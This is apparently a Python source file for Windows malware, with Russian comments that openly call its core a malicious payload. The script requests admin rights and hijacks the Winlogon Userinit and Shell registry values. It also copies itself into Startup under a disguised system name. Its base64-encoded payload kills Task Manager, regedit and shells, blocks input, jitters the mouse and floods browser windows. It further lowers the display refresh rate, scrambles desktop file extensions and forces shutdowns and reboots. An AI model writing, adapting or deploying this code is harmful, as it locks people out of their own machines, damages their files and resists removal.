import os
import time
import subprocess
import threading
import sys
import random
import string
import ctypes
import winreg
import base64
import uuid
import shutil
import ctypes.wintypes
from ctypes import windll, Structure, c_ulong, byref

# --- НАСТРОЙКИ ---
SHUTDOWN_DELAY_SECONDS = 25
ACTION_INTERVAL_SECONDS = 0.3

# --- ГЕНЕРИРУЕМЫЕ ИМЕНА ---
random_id = str(uuid.uuid4())[:8]
SCRIPT_NAME = f"sys-core-{random_id}.exe"
TASK_NAME = f"Windows Update Service-{random_id}"
CMD_SCRIPT_NAME = f"cmd_prompt_{random_id}.bat"

# --- ПУТИ ДЛЯ ВНЕДРЕНИЯ ---
STARTUP_FOLDER = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
WINLOGON_REG_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
USERINIT_REG_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
USERINIT_VALUE = "Userinit"
ORIGINAL_USERINIT_VALUE = "C:\\Windows\\system32\\userinit.exe,"
SHELL_VALUE = "Shell"
ORIGINAL_SHELL_VALUE = "explorer.exe"

# --- СПИСКИ ДЛЯ ХАОСА ---
EXTENSIONS_TO_MANGLE = [".txt", ".docx", ".jpg", ".png", ".mp4", ".mp3", ".pdf"]
SOUNDS_TO_PLAY = ["SystemHand", "SystemExclamation", "SystemQuestion", "Critical", "Asterisk"]
PROCESSES_TO_BLOCK = ["taskmgr.exe", "regedit.exe", "msconfig.exe", "cmd.exe", "powershell.exe"]

# --- КОД ДЛЯ БЛОКИРОВКИ КЛАВИАТУРЫ ---
kernel32 = windll.kernel32
user32 = windll.user32

class MOUSEINPUT(Structure):
    _fields_ = (("dx", ctypes.c_long),
                ("dy", ctypes.c_long),
                ("mouseData", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)))

class KEYBDINPUT(Structure):
    _fields_ = (("wVk", ctypes.c_ushort),
                ("wScan", ctypes.c_ushort),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)))

class HARDWAREINPUT(Structure):
    _fields_ = (("uMsg", ctypes.c_ulong),
                ("wParamL", ctypes.c_short),
                ("wParamH", ctypes.c_ushort))

class INPUT(Structure):
    _fields_ = (("type", ctypes.c_ulong),
                ("mi", MOUSEINPUT),
                ("ki", KEYBDINPUT),
                ("hi", HARDWAREINPUT))

def block_keyboard():
    while True:
        for i in range(256):
            user32.keybd_event(i, 0, 0x0002, 0)  # Key down
            user32.keybd_event(i, 0, 0x0002 | 0x0002, 0)  # Key up
        time.sleep(0.1)

# --- ОСНОВНОЙ ВРЕДОНОСНЫЙ КОД (ПАЙЛОАД) ---
PAYLOAD_SCRIPT = """
import os, time, subprocess, random, threading, ctypes, winreg, shutil, sys

def chrome_chaos():
    end_time = time.time() + 25
    while time.time() < end_time:
        try:
            subprocess.Popen("start chrome https://www.google.com/search?q=how+to+remove+a+virus", shell=True)
            time.sleep(0.3)
        except:
            pass

def change_hertz():
    try:
        ps_script = '''
        Add-Type -TypeDefinition @'
        using System;
        using System.Runtime.InteropServices;
        public class Display {
            [DllImport("user32.dll")]
            public static extern int ChangeDisplaySettings(ref DEVMODE d, int flags);
            [StructLayout(LayoutKind.Sequential)]
            public struct DEVMODE {
                public int dmSize;
                public int dmDriverExtra;
                public int dmFields;
                public int dmPelsWidth;
                public int dmPelsHeight;
                public int dmDisplayFrequency;
                public int dmDisplayFlags;
                public int dmDisplayOrientation;
            }
            public const int DM_PELSHEIGHT = 0x100000;
            public const int DM_PELSWIDTH = 0x80000;
            public const int DM_DISPLAYFREQUENCY = 0x400000;
            public const int CDS_UPDATEREGISTRY = 0x01;
            public static void SetHz(int hz) {
                DEVMODE dm = new DEVMODE();
                dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
                dm.dmFields = DM_PELSHEIGHT | DM_PELSWIDTH | DM_DISPLAYFREQUENCY;
                dm.dmPelsWidth = 1024;
                dm.dmPelsHeight = 768;
                dm.dmDisplayFrequency = hz;
                ChangeDisplaySettings(ref dm, CDS_UPDATEREGISTRY);
            }
        }
        '@
        $display = New-Object Display
        $display::SetHz(15)
        '''
        subprocess.run(["powershell", "-Command", ps_script], capture_output=True, creationflags=subprocess.CREATE_HIDE_WINDOW)
    except:
        pass

def mangle_files():
    desktop = os.path.join(os.environ["USERPROFILE"], "Desktop")
    extensions = [".txt", ".docx", ".jpg", ".png", ".mp4", ".mp3", ".pdf", ".bak", ".tmp", ".old"]
    try:
        for item in os.listdir(desktop):
            original_path = os.path.join(desktop, item)
            if os.path.isfile(original_path):
                name, ext = os.path.splitext(item)
                if ext in extensions:
                    new_ext = random.choice(extensions)
                    new_path = os.path.join(desktop, name + new_ext)
                    os.rename(original_path, new_path)
    except:
        pass

def play_sounds():
    try:
        for _ in range(10):
            sound = random.choice(["SystemHand", "SystemExclamation", "SystemQuestion", "Critical", "Asterisk"])
            if sound == "SystemHand":
                ctypes.windll.user32.MessageBeep(0xFFFFFFFF)
            elif sound == "SystemExclamation":
                ctypes.windll.user32.MessageBeep(0xFFFF0000)
            elif sound == "SystemQuestion":
                ctypes.windll.user32.MessageBeep(0xFFFF00FF)
            elif sound == "Critical":
                ctypes.windll.user32.MessageBeep(0xFFFF0010)
            elif sound == "Asterisk":
                ctypes.windll.user32.MessageBeep(0xFFFF0040)
            time.sleep(0.5)
    except:
        pass

def mouse_jitter():
    try:
        for _ in range(100):
            x = random.randint(-15, 15)
            y = random.randint(-15, 15)
            pos = ctypes.wintypes.POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pos))
            ctypes.windll.user32.SetCursorPos(pos.x + x, pos.y + y)
            time.sleep(0.05)
    except:
        pass

def block_task_manager():
    processes_to_kill = ["taskmgr.exe", "regedit.exe", "msconfig.exe", "cmd.exe", "powershell.exe"]
    while True:
        try:
            for proc in processes_to_kill:
                subprocess.run(f"taskkill /f /im {proc} /t", shell=True, creationflags=subprocess.CREATE_HIDE_WINDOW)
            time.sleep(0.2)
        except:
            pass

def disable_keyboard():
    try:
        import ctypes
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

# --- ЗАПУСК ВСЕГО В ПОТОКАХ ---
threading.Thread(target=chrome_chaos).start()
threading.Thread(target=change_hertz).start()
threading.Thread(target=play_sounds).start()
threading.Thread(target=mouse_jitter).start()
threading.Thread(target=block_task_manager).start()
threading.Thread(target=disable_keyboard).start()

# Функция мангла файлов будет работать в основном потоке
mangle_files()

# Выключение компьютера
time.sleep(25)
os.system("shutdown /s /t 0 /f")
"""

PAYLOAD_B64 = base64.b64encode(PAYLOAD_SCRIPT.encode('utf-8')).decode('utf-8')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit()

def execute_payload():
    try:
        decoded_script = base64.b64decode(PAYLOAD_B64).decode('utf-8')
        exec(decoded_script)
    except Exception as e:
        print(f"Error executing payload: {e}")

def persist_startup():
    try:
        dest_path = os.path.join(STARTUP_FOLDER, SCRIPT_NAME)
        shutil.copy2(sys.argv[0], dest_path)
        return True
    except Exception as e:
        print(f"Error persisting to startup: {e}")
        return False

def create_cmd_script():
    try:
        cmd_script_content = f"""@echo off
title AMOGUS DETECTED
color 0C
mode con: cols=50 lines=10
echo AMOGUS IS WATCHING YOU!
echo.
echo Type "amogus" to continue:
set /p input=
if "%input%"=="amogus" (
    shutdown /r /t 0
) else (
    echo WRONG ANSWER!
    timeout /t 5 >nul
    shutdown /r /t 0 /f
)
"""
        with open(CMD_SCRIPT_NAME, "w") as f:
            f.write(cmd_script_content)
        return True
    except Exception as e:
        print(f"Error creating cmd script: {e}")
        return False

def modify_winlogon():
    try:
        # Создаем скрипт для запуска cmd при загрузке
        cmd_script_path = os.path.abspath(CMD_SCRIPT_NAME)
        script_path = os.path.abspath(sys.argv[0])

        # Модифицируем Userinit для запуска cmd
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, USERINIT_REG_KEY, 0, winreg.KEY_WRITE)
        new_userinit_value = f"C:\\Windows\\System32\\cmd.exe /c {cmd_script_path} & {ORIGINAL_USERINIT_VALUE}"
        winreg.SetValueEx(key, USERINIT_VALUE, 0, winreg.REG_SZ, new_userinit_value)
        winreg.Close(key)

        # Модифицируем Shell для запуска скрипта
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WINLOGON_REG_KEY, 0, winreg.KEY_WRITE)
        new_shell_value = f"cmd.exe /c {script_path}"
        winreg.SetValueEx(key, SHELL_VALUE, 0, winreg.REG_SZ, new_shell_value)
        winreg.Close(key)

        return True
    except Exception as e:
        print(f"Error modifying winlogon: {e}")
        return False

def main():
    request_admin()

    # Создаем скрипт для cmd
    if not create_cmd_script():
        print("Failed to create cmd script")
        return

    # Модифицируем winlogon и userinit
    if not modify_winlogon():
        print("Failed to modify winlogon")
        return

    # Запускаем основной хаос
    execute_payload()

    # Блокируем клавиатуру
    threading.Thread(target=block_keyboard, daemon=True).start()

    # Запускаем скрипт в автозагрузке
    persist_startup()

    # Выключаем компьютер после выполнения
    time.sleep(SHUTDOWN_DELAY_SECONDS)
    os.system("shutdown /s /t 0 /f")

if __name__ == "__main__":
    main()